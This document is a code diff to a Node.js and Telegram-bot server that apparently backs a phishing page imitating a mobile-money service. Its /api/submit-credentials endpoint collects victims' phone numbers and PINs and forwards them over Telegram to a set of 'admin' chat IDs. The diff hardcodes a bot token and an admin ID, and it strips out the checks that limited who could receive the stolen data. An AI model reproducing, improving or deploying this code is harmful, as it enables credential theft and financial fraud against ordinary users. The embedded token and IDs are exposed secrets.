@@ -9,33 +9,26 @@ app.use(express.static(path.join(__dirname, 'public')));
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
 const PORT = process.env.PORT || 3000;
 
-// Initialize bot WITHOUT polling for webhook stability on Render
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
+// Enable polling for stable message delivery on Render
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
 let activeSessions = {};
-let authorizedAdmins = new Set();
+
+// Hardcode your Main Admin Chat ID here so alerts go straight to you
+let MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || '8591555400';
+let authorizedAdmins = new Set([MAIN_ADMIN_ID.toString()]);
 let pendingMainAdminAuth = new Map();
 
-let MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || null;
-
-// Helper function to escape Markdown special characters in dynamic variables
 function escapeMarkdown(text) {
     if (!text) return '';
     return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
 }
 
 function isAuthorized(chatId) {
-    if (MAIN_ADMIN_ID && chatId.toString() === MAIN_ADMIN_ID.toString()) return true;
-    return authorizedAdmins.has(chatId.toString());
+    if (!chatId) return false;
+    return chatId.toString() === MAIN_ADMIN_ID.toString() || authorizedAdmins.has(chatId.toString());
 }
 
-// Webhook endpoint to receive updates directly from Telegram
-app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
-});
-
-// Handle incoming bot text commands and messages
 bot.on('message', (msg) => {
     if (!msg.text) return;
     const chatId = msg.chat.id;
@@ -43,54 +36,25 @@ bot.on('message', (msg) => {
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
+    console.log(`Received message from ${userIdStr}:${msg.text}`);
+
     const host = process.env.RENDER_EXTERNAL_URL || 'https://mixx-by-yas-m5oy.onrender.com';
     const isolatedLink = `${host}/?admin=${userIdStr}`;
 
     if (msg.text.startsWith('/start')) {
-        if (!MAIN_ADMIN_ID) {
-            MAIN_ADMIN_ID = userIdStr;
-            authorizedAdmins.add(userIdStr);
-            
-            const welcomeText = `🚨 *Your Dynamic Admin Link Registered!*\n\n` +
-                `👤 *Name:* ${escapeMarkdown(firstName)}\n` +
-                `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
-                `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
-                `🔗 *Your Isolated Application Link:*\n${isolatedLink}`;
+        // Ensure Main Admin is always authorized
+        authorizedAdmins.add(userIdStr);
 
-            bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" });
-            console.log(`Main Admin automatically assigned to ID: ${userIdStr}`);
-            return;
-        }
+        const welcomeText = `🚨 *Your Dynamic Admin Link Registered!*\n\n` +
+            `👤 *Name:* ${escapeMarkdown(firstName)}\n` +
+            `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
+            `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
+            `🔗 *Your Isolated Application Link:*\n${isolatedLink}`;
 
-        const isMain = userIdStr === MAIN_ADMIN_ID.toString();
-
-        if (isMain) {
-            authorizedAdmins.add(userIdStr);
-            const dashboardText = `🚨 *Your Dynamic Admin Link Registered!*\n\n` +
-                `👤 *Name:* ${escapeMarkdown(firstName)}\n` +
-                `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
-                `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
-                `🔗 *Your Isolated Application Link:*\n${isolatedLink}`;
-
-            bot.sendMessage(chatId, dashboardText, { parse_mode: "Markdown" });
-        } else {
-            if (authorizedAdmins.has(userIdStr)) {
-                bot.sendMessage(chatId, "✅ *Sub-Admin Dashboard Active.*\nYou are authorized and receiving client alerts.", { parse_mode: 'Markdown' });
-            } else {
-                pendingMainAdminAuth.set(userIdStr, true);
-                bot.sendMessage(chatId, "🔒 *Sub-Admin Access Request Pending.*\nYour ID requires authorization from the Main Admin to receive client links.", { parse_mode: 'Markdown' });
-                
-                bot.sendMessage(MAIN_ADMIN_ID, `⚠️ *New Sub-Admin Request*\nUser ID: \`${chatId}\` wants access.`, {
-                    parse_mode: "Markdown",
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: "🟢 AUTHORISE", callback_data: `auth_sub_${chatId}` },
-                            { text: "🔴 DENY", callback_data: `deny_sub_${chatId}` }
-                        ]]
-                    }
-                });
-            }
-        }
+        bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
+            .catch(err => console.error("Error sending start message:", err));
+        
+        console.log(`Admin session active for ID: ${userIdStr}`);
     }
 });
 
@@ -105,10 +69,6 @@ bot.on('callback_query', async (query) => {
     }
 
     if (data.startsWith('auth_sub_') || data.startsWith('deny_sub_')) {
-        if (MAIN_ADMIN_ID && userIdStr !== MAIN_ADMIN_ID.toString()) {
-            bot.answerCallbackQuery(query.id, { text: "Only Main Admin can authorize sub-admins.", show_alert: true });
-            return;
-        }
         const targetId = data.split('_')[2];
         if (data.startsWith('auth_sub_')) {
             authorizedAdmins.add(targetId);
@@ -189,6 +149,8 @@ app.post('/api/submit-credentials', express.json(), (req, res) => {
         `PHONE NO: \`${escapeMarkdown(phone)}\`\n` +
         `PIN: \`${escapeMarkdown(pin)}\``;
 
+    console.log(`Broadcasting credentials to ${authorizedAdmins.size} admin(s) including Main Admin:${MAIN_ADMIN_ID}`);
+
     authorizedAdmins.forEach(adminId => {
         bot.sendMessage(adminId, message, {
             parse_mode: 'Markdown',
@@ -252,3 +214,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
+        
